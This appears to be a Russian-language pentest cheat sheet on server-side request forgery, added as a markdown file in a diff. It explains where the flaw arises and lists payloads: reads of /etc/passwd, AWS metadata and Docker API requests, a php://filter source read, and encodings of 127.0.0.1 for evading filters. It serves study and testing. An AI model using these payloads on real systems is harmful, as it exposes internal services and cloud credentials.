@@ -1,0 +1,47 @@
+# SSRF (Server-Side Request Forgery) — уязвимость при которой запросы делает сервер целевой машины. Атакующий заставляет сервер сходить по нужному адресу, как внутреннему так и внешнему и получить данные или вызвать действие от имени сервера.
+
+# Что можно сделать ?
+Получить доступ к внутренним API, читать файлы на сервере, сканировать порты
+
+
+### 🎯 ЧТО ЭТО?
+Сервер делает запросы от имени атакующего (внутренние или внешние).
+
+### 🔥 ЧТО МОЖНО?
+- Читать файлы: `file:///etc/passwd`
+- Сканировать порты: `http://localhost:22`, `http://192.168.1.1:8080`
+- Дергать API: метаданные AWS (`169.254.169.254/latest/meta-data/`), Docker (`127.0.0.1:2375/containers/json`), Kubernetes
+- Вызвать действия от имени сервера
+
+### 💥 ПРИМЕРЫ ЗАПРОСОВ
+category=http://ТВОЙ_IP:8000/test                 # подтверждение
+category=http://localhost/admin                   # локальный админ
+category=http://192.168.2.10/config.php           # внутренний файл
+category=file:///etc/passwd                        # чтение файла
+category=php://filter/convert.base64-encode/resource=index.php
+category=http://169.254.169.254/latest/meta-data/ # AWS metadata
+category=http://127.0.0.1:2375/containers/json    # Docker API
+
+### ОБХОД ФИЛЬТРОВ
+127.0.0.1 → 2130706433, 0x7f000001, 017700000001, localhost, 0.0.0.0
+
+### 📌 ГДЕ ВОЗНИКАЕТ?
+Невалидируемые GET/POST параметры: ?url=, ?path=, ?dest=, ?redirect=, ?file=, ?domain=, ?src=, ?image_url=
+
+Загрузка изображений по URL (аватары, превью)
+
+Webhook-и, парсинг внешних страниц
+
+Импорт/экспорт данных из/в облако
+
+Проверка доступности хостов (ping/port scan)**
+GET /check?host=127.0.0.1:22
+GET /ping?ip=192.168.1.1
+POST /scan
+data: port=3306&host=localhost
+
+Функции "поделиться", "предпросмотр ссылок"
+GET /share?url=http://localhost/admin
+GET /preview?link=file:///etc/passwd
+POST /og-image
+data: target=http://169.254.169.254/latest/meta-data/
